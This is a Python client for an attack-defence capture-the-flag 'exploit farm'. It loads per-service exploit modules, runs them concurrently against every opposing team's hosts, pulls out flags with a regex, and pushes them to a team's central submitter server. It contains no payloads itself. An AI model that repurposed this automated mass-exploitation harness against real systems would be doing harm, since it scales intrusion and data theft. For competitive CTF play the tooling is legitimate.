#!/usr/bin/env python3
"""Team client — steal locally, push flags to the central farm server.

Run this on a teammate's box so their exploits feed the ONE submitter (single
jury token, single rate limit, shared dedup on the server). Stdlib only.

    python farm/client.py --config farm/config.forcad.py --server http://10.60.7.2:8070 --token T
    python farm/client.py ... --once            # single round
    python farm/client.py ... --service web      # only one service

Uses the SAME config as the server (sploit_paths, services, targets, attackdata,
flag_regex, resolve_address). The submitter section is ignored here — the server
submits. The server dedups, so pushing the same flag twice is harmless.
"""
import argparse
import concurrent.futures as cf
import importlib.util
import json
import os
import re
import socket
import subprocess
import sys
import time
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import attackdata          # noqa: E402
import targets as targets_mod  # noqa: E402
from util import get_logger    # noqa: E402

_SPLOITS = {}


def load_config(path):
    spec = importlib.util.spec_from_file_location("farm_config", path)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    cfg = dict(m.CONFIG)
    cfg["resolve_address"] = getattr(m, "resolve_address", None)
    cfg["extract_attackdata"] = getattr(m, "extract_attackdata", None)
    return cfg


def _sploit(svc, path, log):
    if svc in _SPLOITS:
        return _SPLOITS[svc]
    try:
        spec = importlib.util.spec_from_file_location("sp_" + re.sub(r"\W", "_", path), path)
        m = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(m)
        _SPLOITS[svc] = m
    except Exception as e:  # noqa: BLE001
        log.warning("exploit load failed '%s' (%r)" % (svc, e))
        _SPLOITS[svc] = None
    return _SPLOITS[svc]


def _subprocess_services(cfg):
    return set(cfg.get("collectors", {}).get("subprocess_services", []))


def push(server, token, service, target, flags, log):
    body = json.dumps({"flags": flags, "service": service, "target": target,
                       "source": socket.gethostname()}).encode()
    headers = {"Content-Type": "application/json"}
    if token:
        headers["X-Farm-Token"] = token
    req = urllib.request.Request(server.rstrip("/") + "/push", data=body,
                                 headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            res = json.loads(r.read().decode("utf-8", "replace"))
        log.info("push %-10s %-12s %d flag(s) -> queued %s"
                 % (service, target, len(flags), res.get("queued")))
    except Exception as e:  # noqa: BLE001
        log.warning("push failed (%r) — will retry next round" % e)


def run_round(cfg, server, token, log, only_service=None, only_team=None):
    fre = re.compile(cfg["flag_regex"])
    hard_t = cfg.get("collectors", {}).get("hard_timeout",
                                           cfg.get("limits", {}).get("exploit_timeout", 8) + 4)
    mw = cfg.get("limits", {}).get("max_workers", 20)
    subs = _subprocess_services(cfg)
    data = attackdata.refresh(cfg, log)

    if cfg["targets"].get("mode") == "from_attackdata":
        excl = set(cfg["targets"].get("exclude_hosts", []))
        if cfg["targets"].get("my_team_ip"):
            excl.add(cfg["targets"]["my_team_ip"])
        tlist = [{"name": k, "host": k, "id": targets_mod._idof(k)}
                 for k in data.keys() if k not in excl]
    else:
        tlist = targets_mod.resolve(cfg)
    resolve_addr = cfg.get("resolve_address") or (lambda t, svc, base: (t.get("host"), base))

    jobs = []
    for t in tlist:
        if only_team and t["name"] != only_team:
            continue
        entry = data.get(t["name"]) or data.get(t.get("host")) or data.get(str(t["id"])) or {}
        for svc, base in cfg["services"].items():
            if only_service and svc != only_service:
                continue
            path = cfg["sploit_paths"].get(svc)
            if not path or not os.path.exists(path):
                continue
            if svc not in subs and not _sploit(svc, path, log):
                continue
            host, port = resolve_addr(t, svc, base)
            fids = entry.get(svc) if entry else None
            if fids:
                for fid in fids:
                    jobs.append((t, svc, host, port, fid, path))
            else:
                jobs.append((t, svc, host, port, None, path))

    log.info("round: %d target(s), %d job(s)" % (len(tlist), len(jobs)))

    def work(job):
        t, svc, host, port, fid, path = job
        try:
            if svc in subs:
                argv = [sys.executable, path, str(host), str(port)]
                if fid is not None:
                    argv.append(str(fid))
                p = subprocess.run(argv, capture_output=True, timeout=hard_t,
                                   cwd=os.path.dirname(path) or None)
                fl = fre.findall((p.stdout or b"").decode("utf-8", "replace"))
            else:
                fl = _SPLOITS[svc].exploit(host, port, fid) or []
        except Exception:  # noqa: BLE001
            return (job, [])
        return (job, [x.strip() for x in fl if isinstance(x, str) and fre.fullmatch(x.strip())])

    buckets = {}  # (svc, team) -> set(flags)
    import math
    budget = hard_t * math.ceil(len(jobs) / max(1, mw)) + 3 if jobs else 1
    with cf.ThreadPoolExecutor(max_workers=mw) as ex:
        futs = {ex.submit(work, j): j for j in jobs}
        try:
            for fut in cf.as_completed(futs, timeout=budget):
                job, flags = fut.result()
                if flags:
                    t, svc = job[0], job[1]
                    buckets.setdefault((svc, t["name"]), set()).update(flags)
        except cf.TimeoutError:
            pass

    for (svc, team), flags in buckets.items():
        if flags:
            push(server, token, svc, team, sorted(flags), log)


def main():
    ap = argparse.ArgumentParser()
    here = os.path.dirname(os.path.abspath(__file__))
    ap.add_argument("--config", default=os.path.join(here, "config.py"))
    ap.add_argument("--server", required=True, help="farm server base URL, e.g. http://10.60.7.2:8070")
    ap.add_argument("--token", default="", help="server control token (if configured)")
    ap.add_argument("--once", action="store_true")
    ap.add_argument("--service")
    ap.add_argument("--team")
    args = ap.parse_args()

    log = get_logger()
    cfg = load_config(args.config)
    rsec = cfg.get("round_seconds", 30)
    while True:
        t0 = time.time()
        try:
            run_round(cfg, args.server, args.token, log, args.service, args.team)
        except Exception as e:  # noqa: BLE001
            log.error("round error: %r" % e)
        if args.once:
            break
        time.sleep(max(0.0, rsec - (time.time() - t0)))


if __name__ == "__main__":
    main()
